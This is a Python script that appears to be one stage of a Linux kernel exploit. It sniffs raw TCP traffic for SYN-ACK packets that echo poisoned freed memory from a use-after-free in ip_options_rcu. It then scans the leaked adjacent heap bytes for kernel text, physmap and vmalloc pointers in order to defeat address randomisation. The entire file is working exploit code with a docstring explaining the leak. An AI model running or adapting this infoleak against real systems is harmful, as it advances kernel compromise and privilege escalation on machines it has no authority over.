#!/usr/bin/env python3
"""sniff_leak.py - harvest kernel pointers from the poison-read echo channel.

On a slub_debug=P kernel, a freed ip_options_rcu slot is poisoned (0x6b), so
when the UAF reader (retransmit SYN-ACK build) reads the dangling object it
sees optlen=107 and copies 107 bytes from object+32 into the packet:

    packet iph+20+k  ==  object+32+k
    k = 0..71   -> object bytes 32..103   (poison 0x6b)
    k = 72..106 -> object bytes 104..138  = THE NEXT SLOT (neighbor object
                                           bytes 0..34) - the actual leak!

So a received SYN-ACK whose copied region starts with 0x6b poison carries
~35 bytes of the adjacent heap object at packet offsets iph+92..+126.
Scan those bytes for kernel pointers (text/data = slide, physmap, vmalloc).
"""
import socket, struct, sys, collections

def region(v):
    if 0xffffffff80000000 <= v < 0xffffffffc0000000: return "TEXT/DATA"
    if 0xffff888000000000 <= v < 0xffffc80000000000: return "physmap/heap"
    if 0xffffc88000000000 <= v < 0xffffec0000000000: return "vmalloc"
    if 0xfffffe0000000000 <= v < 0xffffff0000000000: return "cpu_entry"
    return None

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1 << 23)

import time
t0 = time.time()
lasthb = t0

seen = collections.Counter()
samples = collections.Counter()
n_pkt = 0
leak_pkts = 0
running = True
def _stop(*a):
    global running
    running = False
import signal
signal.signal(signal.SIGTERM, _stop)
signal.signal(signal.SIGINT, _stop)

try:
    while running:
        pkt, _ = s.recvfrom(65535)
        n_pkt += 1
        # NOTE: no sport filter - a poison-echo SYN-ACK has its TCP header
        # overwritten by the copied region, so sport is garbage. Detect by
        # the poison bytes at the start of the copied region (iph+20).
        leak = pkt[20:127]
        if len(leak) < 90:
            continue
        # poison-read detection: copied region starts with 0x6b poison
        if leak[0] != 0x6b or leak[8] != 0x6b or leak[16] != 0x6b:
            continue
        leak_pkts += 1
        # neighbor bytes: object+96..+138 (slot 96) / +104..+138 (slot 104)
        # -> packet leak[64:107] covers both; scan for kernel pointers
        nb = leak[64:107]
        samples[nb[:16].hex()] += 1
        for off in range(0, len(nb) - 7):
            v = int.from_bytes(nb[off:off+8], "little")
            r = region(v)
            if r:
                seen[(off, r)] += 1
                print("[leak] nb+%-3d %-13s 0x%016x" % (off, r, v), flush=True)
        now = time.time()
        if now - lasthb > 10:
            print("[hb] pkts=%d poison_echo=%d ptrs=%d" % (n_pkt, leak_pkts, sum(seen.values())), flush=True)
            lasthb = now
except KeyboardInterrupt:
    pass
print("== %d pkts, %d poison-echo pkts ==" % (n_pkt, leak_pkts), flush=True)
print("== neighbor signatures (top) ==", flush=True)
for sig, c in samples.most_common(10):
    print("  %s x%d" % (sig, c), flush=True)
print("== pointer hits ==", flush=True)
for (off, r), c in seen.most_common(20):
    print("  nb+%-3d %-13s x%d" % (off, r, c), flush=True)
